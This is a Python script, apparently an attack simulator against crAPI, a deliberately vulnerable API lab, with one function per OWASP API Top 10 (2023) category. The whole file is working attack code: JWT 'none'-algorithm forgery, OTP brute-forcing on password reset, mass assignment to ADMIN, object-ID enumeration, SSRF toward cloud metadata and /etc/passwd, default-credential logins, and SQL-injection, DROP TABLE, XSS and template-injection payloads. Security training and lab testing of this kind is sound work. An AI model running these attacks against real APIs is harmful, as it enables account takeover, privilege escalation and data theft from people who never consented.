#!/usr/bin/env python3
"""
crAPI OWASP API Security Top 10 (2023) Attack Simulator
Usage: python crapi_owasp.py --url http://localhost:8888 --attack all
"""

import argparse
import json
import os
import random
import string
import sys
import time

import requests

SESSION_FILE = os.path.join(os.path.dirname(__file__), ".crapi_session.json")

# ── colour helpers ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def vuln(msg):  print(f"  {GREEN}[VULNERABLE]{RESET} {msg}")
def safe(msg):  print(f"  {RED}[NOT VULN]{RESET}  {msg}")
def info(msg):  print(f"  {YELLOW}[INFO]{RESET}      {msg}")
def err(msg):   print(f"  {RED}[ERROR]{RESET}     {msg}")
def header(title): print(f"\n{BOLD}{CYAN}{'─'*60}\n{title}\n{'─'*60}{RESET}")


# ── session / auth helpers ────────────────────────────────────────────────────
def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))

def register_user(base, email, password, name):
    r = requests.post(f"{base}/identity/api/auth/signup",
                      json={"email": email, "password": password, "name": name},
                      timeout=10)
    return r

def login(base, email, password):
    r = requests.post(f"{base}/identity/api/auth/login",
                      json={"email": email, "password": password},
                      timeout=10)
    r.raise_for_status()
    token = r.json().get("token")
    if not token:
        raise RuntimeError(f"Login failed for {email}: {r.text}")
    return token

def auth_headers(token):
    return {"Authorization": f"Bearer {token}"}

def get_vehicles(base, token):
    r = requests.get(f"{base}/identity/api/v2/vehicle/vehicles",
                     headers=auth_headers(token), timeout=10)
    if r.status_code == 200:
        return r.json()
    return []

def get_dashboard(base, token):
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers=auth_headers(token), timeout=10)
    if r.status_code == 200:
        return r.json()
    return {}


# ── setup: register two users (persisted across runs) ────────────────────────
def setup(base):
    print(f"\n{BOLD}Setting up test users …{RESET}")

    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE) as f:
            saved = json.load(f)
        if saved.get("base") == base:
            u1, u2 = saved["u1"], saved["u2"]
            try:
                t1 = login(base, u1["email"], u1["password"])
                t2 = login(base, u2["email"], u2["password"])
                info(f"Reusing saved identities: {u1['email']} / {u2['email']}")
                return u1, t1, u2, t2
            except Exception:
                info("Saved credentials no longer valid — creating new users")

    suffix1 = rand_str()
    suffix2 = rand_str()
    u1 = {"email": f"attacker_{suffix1}@test.com",  "password": "Attacker123!", "name": f"Attacker {suffix1}"}
    u2 = {"email": f"victim_{suffix2}@test.com",    "password": "Victim123!",   "name": f"Victim {suffix2}"}

    for u in (u1, u2):
        r = register_user(base, u["email"], u["password"], u["name"])
        if r.status_code in (200, 201):
            info(f"Registered {u['email']}")
        elif r.status_code == 409:
            info(f"Already exists: {u['email']}")
        else:
            raise RuntimeError(f"Registration failed: {r.status_code} {r.text}")

    t1 = login(base, u1["email"], u1["password"])
    t2 = login(base, u2["email"], u2["password"])

    with open(SESSION_FILE, "w") as f:
        json.dump({"base": base, "u1": u1, "u2": u2}, f, indent=2)
    info(f"Saved identities to {SESSION_FILE}")
    info(f"Logged in as attacker ({u1['email']}) and victim ({u2['email']})")
    return u1, t1, u2, t2


# ── API1: Broken Object Level Authorization (BOLA) ───────────────────────────
def api1(base, u1, t1, u2, t2):
    header("API1:2023 — Broken Object Level Authorization (BOLA)")

    # Attacker reads victim's mechanic reports by iterating IDs
    for report_id in range(1, 6):
        r = requests.get(f"{base}/workshop/api/mechanic/mechanic_report",
                         params={"report_id": report_id},
                         headers=auth_headers(t1), timeout=10)
        if r.status_code == 200:
            data = r.json()
            vuln(f"Accessed mechanic report #{report_id} — owner: {data.get('mechanic', {}).get('email', 'unknown')}")
            break
    else:
        safe("No mechanic reports accessible via ID enumeration (1–5)")

    # Attacker reads victim's orders
    dash2 = get_dashboard(base, t2)
    victim_id = dash2.get("id")
    if victim_id:
        r = requests.get(f"{base}/workshop/api/shop/orders/all",
                         params={"limit": 20, "offset": 0},
                         headers=auth_headers(t1), timeout=10)
        if r.status_code == 200:
            orders = r.json().get("orders", [])
            others = [o for o in orders if str(o.get("user", {}).get("id")) != str(victim_id)]
            if others:
                vuln(f"Order listing exposes {len(others)} orders belonging to other users")
            else:
                safe("Order listing scoped correctly to authenticated user")
        else:
            info(f"Orders endpoint returned {r.status_code}")
    else:
        info("Could not determine victim user ID — skipping order BOLA check")


# ── API2: Broken Authentication ───────────────────────────────────────────────
def api2(base, u1, t1, u2, t2):
    header("API2:2023 — Broken Authentication")

    # 1. JWT algorithm confusion: replace alg with 'none'
    import base64
    parts = t1.split(".")
    if len(parts) == 3:
        header_json = json.loads(base64.b64decode(parts[0] + "==").decode())
        header_json["alg"] = "none"
        fake_header = base64.urlsafe_b64encode(json.dumps(header_json).encode()).rstrip(b"=").decode()
        fake_token = f"{fake_header}.{parts[1]}."
        r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                         headers=auth_headers(fake_token), timeout=10)
        if r.status_code == 200:
            vuln("JWT 'none' algorithm accepted — authentication bypassed")
        else:
            safe(f"JWT 'none' algorithm rejected ({r.status_code})")

    # 2. OTP brute-force on password reset (check if rate-limited)
    r = requests.post(f"{base}/identity/api/auth/forget-password",
                      json={"email": u2["email"]}, timeout=10)
    info(f"Forget-password for victim: {r.status_code}")
    attempts = 0
    blocked = False
    for otp in range(1000, 1010):  # small sample to check rate limiting
        r = requests.post(f"{base}/identity/api/auth/v3/check-otp",
                          json={"email": u2["email"], "otp": str(otp), "password": "Hacked123!"},
                          timeout=10)
        attempts += 1
        if r.status_code == 429:
            blocked = True
            safe(f"Rate-limited after {attempts} OTP attempts")
            break
    if not blocked:
        vuln(f"No rate limiting on OTP endpoint — {attempts} attempts allowed without block")

    # 3. Weak password acceptance
    suffix = rand_str()
    r = register_user(base, f"weakpwd_{suffix}@test.com", "1234", "Weak User")
    if r.status_code in (200, 201):
        vuln("Weak password '1234' accepted during registration")
    else:
        safe(f"Weak password rejected ({r.status_code})")


# ── API3: Broken Object Property Level Authorization (BOPLA) ─────────────────
def api3(base, u1, t1, u2, t2):
    header("API3:2023 — Broken Object Property Level Authorization (BOPLA)")

    # 1. Excessive data exposure — check dashboard response
    dash = get_dashboard(base, t1)
    sensitive_fields = {"credit_balance", "available_credit", "phone_number", "role"}
    exposed = sensitive_fields & set(dash.keys())
    if exposed:
        vuln(f"Dashboard exposes sensitive fields: {exposed}")
    else:
        info(f"Dashboard fields: {list(dash.keys())}")

    # 2. Mass assignment — try to escalate role or set credit via profile update
    r = requests.put(f"{base}/identity/api/v2/user/edit-profile",
                     headers=auth_headers(t1),
                     json={"name": "Hacker", "number": "9999999999",
                           "role": "ADMIN", "available_credit": 99999},
                     timeout=10)
    if r.status_code in (200, 201):
        updated = r.json()
        if str(updated.get("role", "")).upper() == "ADMIN":
            vuln("Mass assignment: role elevated to ADMIN via profile update")
        elif updated.get("available_credit") == 99999:
            vuln("Mass assignment: available_credit set to 99999 via profile update")
        else:
            safe("Mass assignment fields ignored in profile update")
    else:
        info(f"Edit-profile returned {r.status_code}")

    # 3. Check community post for excessive user data
    r = requests.get(f"{base}/community/api/v2/community/posts/recent",
                     headers=auth_headers(t1), timeout=10)
    if r.status_code == 200:
        posts = r.json().get("posts", [])
        if posts:
            author = posts[0].get("author", {})
            if "email" in author or "phone_number" in author:
                vuln(f"Community posts expose author PII: {list(author.keys())}")
            else:
                info(f"Author fields in posts: {list(author.keys())}")


# ── API4: Unrestricted Resource Consumption ───────────────────────────────────
def api4(base, u1, t1, u2, t2):
    header("API4:2023 — Unrestricted Resource Consumption")

    # Rapid-fire requests to a resource-heavy endpoint
    endpoint = f"{base}/community/api/v2/community/posts/recent"
    start = time.time()
    blocked = False
    for i in range(20):
        r = requests.get(endpoint, headers=auth_headers(t1), timeout=10)
        if r.status_code == 429:
            elapsed = time.time() - start
            safe(f"Rate-limited after {i+1} requests in {elapsed:.1f}s")
            blocked = True
            break
    if not blocked:
        elapsed = time.time() - start
        vuln(f"No rate limiting — 20 requests in {elapsed:.1f}s, all succeeded")

    # Check for pagination abuse (large page size)
    r = requests.get(f"{base}/workshop/api/shop/products",
                     params={"limit": 9999, "offset": 0},
                     headers=auth_headers(t1), timeout=10)
    if r.status_code == 200:
        products = r.json()
        count = len(products) if isinstance(products, list) else products.get("total", "?")
        vuln(f"No max page size enforcement — limit=9999 accepted, returned {count} items")
    else:
        info(f"Large limit request: {r.status_code}")


# ── API5: Broken Function Level Authorization (BFLA) ─────────────────────────
def api5(base, u1, t1, u2, t2):
    header("API5:2023 — Broken Function Level Authorization (BFLA)")

    admin_endpoints = [
        ("GET",  "/identity/api/v2/admin/users"),
        ("GET",  "/workshop/api/v2/mechanic/driver_report"),
        ("GET",  "/workshop/api/admin/mechanics"),
        ("POST", "/workshop/api/v2/admin/coupon/new-coupon"),
    ]
    for method, path in admin_endpoints:
        r = requests.request(method, f"{base}{path}",
                             headers=auth_headers(t1), timeout=10)
        if r.status_code == 200:
            vuln(f"{method} {path} → 200 (accessible without admin role)")
        elif r.status_code in (401, 403):
            safe(f"{method} {path} → {r.status_code} (correctly blocked)")
        else:
            info(f"{method} {path} → {r.status_code}")


# ── API6: Unrestricted Access to Sensitive Business Flows ────────────────────
def api6(base, u1, t1, u2, t2):
    header("API6:2023 — Unrestricted Access to Sensitive Business Flows")

    # 1. Apply same coupon twice
    coupon_code = "TRAC075"
    for attempt in range(1, 3):
        r = requests.post(f"{base}/workshop/api/shop/apply-coupon",
                          headers=auth_headers(t1),
                          json={"coupon_code": coupon_code, "amount": 10.0},
                          timeout=10)
        if r.status_code == 200 and attempt == 2:
            vuln(f"Coupon '{coupon_code}' applied twice — no single-use enforcement")
        elif r.status_code == 200 and attempt == 1:
            info(f"Coupon applied (attempt {attempt}): {r.status_code}")
        elif attempt == 2 and r.status_code != 200:
            safe(f"Coupon reuse blocked on second attempt ({r.status_code})")

    # 2. Order with negative/zero quantity
    vehicles = get_vehicles(base, t1)
    vehicle_id = vehicles[0]["vehicleId"] if vehicles else "dummy-id"
    r = requests.post(f"{base}/workshop/api/shop/orders",
                      headers=auth_headers(t1),
                      json={"product_id": 1, "quantity": -1, "vehicle_id": vehicle_id},
                      timeout=10)
    if r.status_code in (200, 201):
        vuln(f"Order accepted with quantity=-1 (could credit account)")
    else:
        safe(f"Negative quantity order rejected ({r.status_code})")


# ── API7: Server Side Request Forgery (SSRF) ─────────────────────────────────
def api7(base, u1, t1, u2, t2):
    header("API7:2023 — Server Side Request Forgery (SSRF)")

    vehicles = get_vehicles(base, t1)
    if not vehicles:
        info("No vehicles found for SSRF test — add a vehicle first")
        return

    vehicle_id = vehicles[0]["vehicleId"]

    # crAPI video upload accepts a URL — point it at an internal resource
    internal_urls = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://localhost:8080/actuator",             # Spring Boot actuator
        "file:///etc/passwd",
    ]
    for iurl in internal_urls:
        r = requests.post(f"{base}/workshop/api/merchant/contact_mechanic",
                          headers=auth_headers(t1),
                          json={"mechanic_code": "TRAC001",
                                "problem_details": "SSRF test",
                                "vehicle_id": vehicle_id,
                                "mechanic_api": iurl,
                                "repeat_request": 1},
                          timeout=15)
        if r.status_code == 200:
            body = r.text
            if "ami-id" in body or "root:" in body or "actuator" in body.lower():
                vuln(f"SSRF successful — server fetched {iurl}\n    Response snippet: {body[:200]}")
            else:
                vuln(f"mechanic_api URL accepted ({iurl}) — server made outbound request (status 200)")
            break
        elif r.status_code in (400, 422):
            info(f"mechanic_api with internal URL rejected ({r.status_code})")
        else:
            info(f"mechanic_api → {r.status_code}")


# ── API8: Security Misconfiguration ──────────────────────────────────────────
def api8(base, u1, t1, u2, t2):
    header("API8:2023 — Security Misconfiguration")

    # Check exposed API docs / Swagger
    doc_paths = ["/api-docs", "/swagger-ui.html", "/swagger-ui/",
                 "/v2/api-docs", "/openapi.json", "/api/swagger.json"]
    for path in doc_paths:
        r = requests.get(f"{base}{path}", timeout=10)
        if r.status_code == 200:
            vuln(f"API documentation exposed at {path}")

    # Stack traces / verbose errors
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers={"Authorization": "Bearer invalidtoken"}, timeout=10)
    body = r.text.lower()
    if any(k in body for k in ("stack", "traceback", "exception", "at com.", "at org.")):
        vuln(f"Verbose error / stack trace in response: {r.text[:300]}")
    else:
        safe(f"No stack trace in error response ({r.status_code})")

    # Default/weak credentials on admin panel
    for creds in [("admin", "admin"), ("admin", "password"), ("test", "test")]:
        r = requests.post(f"{base}/identity/api/auth/login",
                          json={"email": creds[0], "password": creds[1]}, timeout=10)
        if r.status_code == 200:
            vuln(f"Default credentials accepted: {creds[0]}:{creds[1]}")
            break
    else:
        safe("Default credentials rejected")

    # CORS misconfiguration
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers={**auth_headers(t1), "Origin": "https://evil.com"}, timeout=10)
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    if acao in ("*", "https://evil.com"):
        vuln(f"CORS misconfigured: Access-Control-Allow-Origin: {acao}")
    else:
        safe(f"CORS header: '{acao}'")


# ── API9: Improper Inventory Management ──────────────────────────────────────
def api9(base, u1, t1, u2, t2):
    header("API9:2023 — Improper Inventory Management")

    # Try deprecated/legacy API versions
    legacy_endpoints = [
        "/identity/api/v1/user/dashboard",
        "/identity/api/v1/vehicle/vehicles",
        "/workshop/api/v1/shop/products",
        "/community/api/v1/community/posts/recent",
    ]
    for path in legacy_endpoints:
        r = requests.get(f"{base}{path}",
                         headers=auth_headers(t1), timeout=10)
        if r.status_code == 200:
            vuln(f"Legacy endpoint accessible: {path}")
        elif r.status_code == 404:
            safe(f"Legacy endpoint removed: {path}")
        else:
            info(f"{path} → {r.status_code}")

    # Undocumented / beta endpoints
    beta_endpoints = [
        "/workshop/api/v2/user/changeEmailToken",
        "/identity/api/v2/user/change-email",
    ]
    for path in beta_endpoints:
        r = requests.get(f"{base}{path}",
                         headers=auth_headers(t1), timeout=10)
        if r.status_code not in (404, 405):
            vuln(f"Non-production endpoint reachable: {path} ({r.status_code})")


# ── API10: Unsafe Consumption of APIs ────────────────────────────────────────
def api10(base, u1, t1, u2, t2):
    header("API10:2023 — Unsafe Consumption of APIs")

    # crAPI contacts a mechanic API — inject SQL/command in fields that flow through
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE mechanics;--",
        "<script>alert(1)</script>",
        "{{7*7}}",  # SSTI
    ]
    vehicles = get_vehicles(base, t1)
    vehicle_id = vehicles[0]["vehicleId"] if vehicles else "dummy"

    for payload in payloads:
        r = requests.post(f"{base}/workshop/api/merchant/contact_mechanic",
                          headers=auth_headers(t1),
                          json={"mechanic_code": "TRAC001",
                                "problem_details": payload,
                                "vehicle_id": vehicle_id,
                                "mechanic_api": f"{base}/workshop/api/mechanic/receive_report",
                                "repeat_request": 1},
                          timeout=10)
        if r.status_code == 200:
            body = r.text
            if "49" in body:  # 7*7=49 → SSTI
                vuln(f"SSTI confirmed via mechanic API — payload '{payload}' evaluated to 49")
            elif "error" in body.lower() and ("sql" in body.lower() or "syntax" in body.lower()):
                vuln(f"SQL error exposed via third-party mechanic API — payload: {payload}")
            else:
                info(f"Payload '{payload[:30]}' sent — response: {body[:100]}")
        else:
            info(f"Payload '{payload[:30]}' → {r.status_code}")


# ── attack registry ───────────────────────────────────────────────────────────
ATTACKS = {
    "api1":  ("BOLA",                   api1),
    "api2":  ("Broken Authentication",  api2),
    "api3":  ("BOPLA",                  api3),
    "api4":  ("Resource Consumption",   api4),
    "api5":  ("BFLA",                   api5),
    "api6":  ("Business Flow Abuse",    api6),
    "api7":  ("SSRF",                   api7),
    "api8":  ("Security Misconfiguration", api8),
    "api9":  ("Improper Inventory",     api9),
    "api10": ("Unsafe API Consumption", api10),
}


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="crAPI OWASP API Security Top 10 (2023) simulator")
    parser.add_argument("--url",    default="http://localhost:8888",
                        help="crAPI base URL (default: http://localhost:8888)")
    parser.add_argument("--attack", default="all",
                        help="Attack to run: all | api1 | api2 | … | api10 "
                             "(comma-separated for multiple, e.g. api1,api3)")
    parser.add_argument("--list",   action="store_true",
                        help="List available attacks and exit")
    parser.add_argument("--reset",  action="store_true",
                        help="Clear saved session and create fresh test users")
    args = parser.parse_args()

    if args.list:
        print(f"\n{'ID':<8} {'Name'}")
        print("─" * 40)
        for key, (name, _) in ATTACKS.items():
            print(f"{key:<8} {name}")
        sys.exit(0)

    if args.reset and os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)
        print("Session cleared — fresh users will be created on next run")
        sys.exit(0)

    base = args.url.rstrip("/")

    # connectivity check
    try:
        requests.get(f"{base}/health", timeout=5)
    except requests.exceptions.ConnectionError:
        try:
            requests.get(base, timeout=5)
        except requests.exceptions.ConnectionError:
            print(f"{RED}Cannot reach {base} — is crAPI running?{RESET}")
            sys.exit(1)

    print(f"{BOLD}Target:{RESET} {base}")

    try:
        u1, t1, u2, t2 = setup(base)
    except Exception as e:
        print(f"{RED}Setup failed: {e}{RESET}")
        sys.exit(1)

    selected = args.attack.lower()
    if selected == "all":
        to_run = list(ATTACKS.keys())
    else:
        to_run = [s.strip() for s in selected.split(",")]
        invalid = [k for k in to_run if k not in ATTACKS]
        if invalid:
            print(f"{RED}Unknown attack(s): {invalid}  — use --list to see options{RESET}")
            sys.exit(1)

    for key in to_run:
        name, fn = ATTACKS[key]
        try:
            fn(base, u1, t1, u2, t2)
        except requests.exceptions.RequestException as e:
            err(f"{key.upper()} network error: {e}")
        except Exception as e:
            err(f"{key.upper()} unexpected error: {e}")

    print(f"\n{BOLD}Done.{RESET}\n")


if __name__ == "__main__":
    main()
